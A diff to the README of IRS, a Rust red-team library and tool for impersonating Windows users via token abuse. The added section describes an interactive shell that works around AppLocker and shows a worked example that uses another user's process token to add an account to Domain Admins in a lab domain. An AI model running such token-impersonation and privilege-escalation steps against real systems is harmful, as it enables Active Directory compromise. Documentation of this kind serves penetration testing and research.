@@ -1,5 +1,9 @@
 # IRS (Impersonate-RS)
 
+---
+### **EDIT**: Interactive shell functionnality added that can be useful in environments where it's not possible to pass arguments (e.g. *AppLocker*).
+---
+
 > 💡 IRS is a library version of [https://github.com/zblurx/impersonate-rs](https://github.com/zblurx/impersonate-rs), [zblurx](https://twitter.com/_zblurx)
 
 Reimplementation of [Defte](https://twitter.com/Defte_) [Impersonate](https://github.com/sensepost/impersonate) in plain Rust. For more informations about it, see this [blogpost](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/).
@@ -21,6 +25,7 @@ This approach will allow you to impersonate any user on the target computer as l
     - [Exec command](#exec)
     - [Spawn process](#spawn)
     - [Library example](#library)
+    - [Interactive shell](#interactive)
 - [Demo](#demo)
 
 ## Build
@@ -205,6 +210,29 @@ To see all the available functions use the following command to open the **Rust 
 
 ```bash
 cargo doc --open --no-deps
+```
+
+### `interactive`
+```bash
+PS C:\Users\tortueninja\Desktop> .\irs.exe
+[*] No arguments passed
+[*] Launching interactive shell...
+irs> help
+Available commands:
+  list
+  exec <pid> <command>
+  spawn <pid> <binary>
+  exit
+```
+Example of `exec` function:
+```
+irs> list
+[...]
+[msedge.exe                 ] [PROCESS: 9364 ] [SESSION: 3 ] [TYPE: Primary] [Medium] [USER: PWN\superdauser         ]
+irs> exec 9364 net group 'Domain Admins' tortueninja /add /domain
+The request will be processed at a domain controller for domain pwn.lab.
+
+The command completed successfully.
 ```
 
 ## Demo
